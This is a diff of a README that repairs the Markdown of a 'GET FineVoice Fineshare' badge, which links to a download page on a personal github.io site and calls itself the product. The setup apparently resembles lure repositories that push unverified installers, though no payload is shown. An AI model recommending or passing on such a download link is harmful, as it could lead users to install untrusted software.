@@ -221,7 +221,7 @@ This tree does not include a paper or a BibTeX block. Product questions go to th
 
 Install FineVoice Fineshare from the button. Sign in, then pick the browser seat or the desktop app. The desktop app is the one to use when Discord, Zoom, or OBS must hear the changed mic.
 
-[![GET FineVoice Fineshare](https://img.shields.io/badge/GET-FineVoice%20Fineshare-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)][https://michelleperezh.github.io/.github/FineVoice-Fineshare]
+[![GET FineVoice Fineshare](https://img.shields.io/badge/GET-FineVoice%20Fineshare-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://michelleperezh.github.io/.github/FineVoice-Fineshare)
 
 The button is the product. The commands below are only for this companion tree.
 
